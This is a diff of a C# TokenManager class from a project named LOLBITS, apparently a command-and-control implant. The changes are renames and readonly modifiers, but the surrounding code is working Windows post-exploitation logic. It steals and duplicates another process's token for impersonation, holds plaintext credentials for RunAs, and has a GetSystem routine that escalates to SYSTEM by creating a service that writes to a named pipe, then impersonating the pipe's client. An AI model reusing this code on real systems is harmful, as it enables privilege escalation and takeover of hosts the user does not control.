@@ -12,18 +12,18 @@ namespace LOLBITS
     public class TokenManager
     {
         public static IntPtr Token; 
-        public static int Method; // 1 = CreateProcessAsUser ; 2 = CreateProcessWithToken ; Runas with valid credentials
-        public static string[] creds = new string[3]; // user - domain ('.' for local) - password 
-        private static string PipeName;
+        public static int Method; // 1 = CreateProcessAsUser ; 2 = CreateProcessWithToken ; RunAs with valid credentials
+        public static readonly string[] Credentials = new string[3]; // user - domain ('.' for local) - password 
+        private static string _pipeName;
         private const int NumThreads = 1;
-        private SyscallManager syscall;
+        private readonly SyscallManager sysCall;
 
 
-        public TokenManager(SyscallManager syscall)
+        public TokenManager(SyscallManager sysCall)
         {
             Token = IntPtr.Zero;
             Method = 0;
-            this.syscall = syscall;
+            this.sysCall = sysCall;
         }
 
         public void Rev2Self()
@@ -48,33 +48,33 @@ namespace LOLBITS
             try
             {
                 IntPtr token = IntPtr.Zero;
-                Utils.getProcessToken(Process.GetCurrentProcess().Handle, Utils.TokenAccessFlags.TOKEN_ADJUST_PRIVILEGES, out token, syscall);
+                Utils.GetProcessToken(Process.GetCurrentProcess().Handle, Utils.TokenAccessFlags.TokenAdjustPrivileges, out token, sysCall);
                 
-                Utils.enablePrivileges(token, l);
+                Utils.EnablePrivileges(token, l);
 
-                Utils.getProcessHandle(pid, out phandle, Utils.ProcessAccessFlags.QueryInformation);
+                Utils.GetProcessHandle(pid, out phandle, Utils.ProcessAccessFlags.QueryInformation);
 
-                Utils.getProcessToken(phandle, Utils.TokenAccessFlags.TOKEN_DUPLICATE, out ptoken, syscall);
+                Utils.GetProcessToken(phandle, Utils.TokenAccessFlags.TokenDuplicate, out ptoken, sysCall);
 
                 Utils.CloseHandle(phandle);
 
-                Utils.TokenAccessFlags tokenAccess = Utils.TokenAccessFlags.TOKEN_QUERY | Utils.TokenAccessFlags.TOKEN_ASSIGN_PRIMARY |
-                   Utils.TokenAccessFlags.TOKEN_DUPLICATE | Utils.TokenAccessFlags.TOKEN_ADJUST_DEFAULT |
-                   Utils.TokenAccessFlags.TOKEN_ADJUST_SESSIONID;
+                Utils.TokenAccessFlags tokenAccess = Utils.TokenAccessFlags.TokenQuery | Utils.TokenAccessFlags.TokenAssignPrimary |
+                   Utils.TokenAccessFlags.TokenDuplicate | Utils.TokenAccessFlags.TokenAdjustDefault |
+                   Utils.TokenAccessFlags.TokenAdjustSessionid;
 
-                Utils.duplicateToken(ptoken, tokenAccess, Utils.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, Utils.TOKEN_TYPE.TokenPrimary, out imptoken);
+                Utils.DuplicateToken(ptoken, tokenAccess, Utils.SecurityImpersonationLevel.SecurityImpersonation, Utils.TokenType.TokenPrimary, out imptoken);
 
-                Utils.STARTUPINFO startupInfo = new Utils.STARTUPINFO();
+                Utils.StartupInfo startupInfo = new Utils.StartupInfo();
                 startupInfo.cb = Marshal.SizeOf(startupInfo);
                 startupInfo.lpDesktop = "";
                 startupInfo.wShowWindow = 0;
                 startupInfo.dwFlags |= 0x00000001;
 
-                Utils.PROCESS_INFORMATION processInfo = new Utils.PROCESS_INFORMATION();
+                Utils.ProcessInformation processInfo = new Utils.ProcessInformation();
 
 
                 if (Method == 0)
-                    Utils.determineImpersonationMethod(imptoken, new Utils.LogonFlags(), startupInfo, out processInfo);
+                    Utils.DetermineImpersonationMethod(imptoken, new Utils.LogonFlags(), startupInfo, out processInfo);
 
                 if (Method != 0)
                 {
@@ -90,14 +90,14 @@ namespace LOLBITS
 
         }
 
-        public bool getSystem()
+        public static bool GetSystem()
         {
 
-            PipeName = Jobs.RandomString(7);
+            _pipeName = Jobs.RandomString(7);
             bool exit = false;
             Thread server = new Thread(ServerThread);
 
-            string cmd = "sc create NewDefaultService2 binpath= \"c:\\windows\\system32\\cmd.exe /C echo data > \\\\.\\pipe\\" + PipeName + "\"";
+            string cmd = "sc create NewDefaultService2 binpath= \"c:\\windows\\system32\\cmd.exe /C echo data > \\\\.\\pipe\\" + _pipeName + "\"";
             Utils.ExecuteCommand(cmd);
 
             server.Start();
@@ -129,7 +129,7 @@ namespace LOLBITS
 
         private static void ServerThread(object data)
         {
-            NamedPipeServerStream pipeServer = new NamedPipeServerStream(PipeName, PipeDirection.InOut, NumThreads);
+            NamedPipeServerStream pipeServer = new NamedPipeServerStream(_pipeName, PipeDirection.InOut, NumThreads);
             int threadId = Thread.CurrentThread.ManagedThreadId;
 
 
@@ -162,7 +162,7 @@ namespace LOLBITS
 
         public bool Runas(string domain, string user, string password)
         {
-            Utils.Runas(domain, user, password);
+            Utils.RunAs(domain, user, password);
 
             if (Method == 3)
                 return true;
@@ -175,8 +175,8 @@ namespace LOLBITS
     // Defines the data protocol for reading and writing strings on our stream
     public class StreamString
     {
-        private Stream ioStream;
-        private UnicodeEncoding streamEncoding;
+        private readonly Stream ioStream;
+        private readonly UnicodeEncoding streamEncoding;
 
         public StreamString(Stream ioStream)
         {
